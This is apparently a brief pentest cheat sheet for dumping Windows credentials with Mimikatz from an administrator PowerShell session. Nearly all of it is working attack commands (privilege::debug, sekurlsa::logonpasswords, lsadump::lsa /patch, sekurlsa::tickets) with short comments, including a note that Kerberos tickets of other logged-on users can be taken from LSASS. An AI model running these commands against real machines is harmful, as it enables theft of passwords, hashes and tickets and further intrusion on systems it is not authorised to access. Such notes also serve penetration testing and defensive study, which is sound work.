#From a powershell session as Administrator (CMD as Administrator), we execute the Mimikatz.exe:

.\mimikatz.exe

#Once in the mimikatz session we upgrade our privilege token and retrieve the credentials from the log-in users 

privilege::debug

sekurlsa::logonpasswords

# Or 

lsadump::lsa /patch

#At this point we could try to crack those hashes but also we could exploit Kerberos authentication by abusing TGT and service tickets we know that Kerberos TGT and service tickets for users currently logged on to the local machine are stored for future use. These tickets are also stored in LSASS, and we can use Mimikatz to interact with and retrieve our own tickets as well as the tickets of other local users.

sekurlsa::tickets
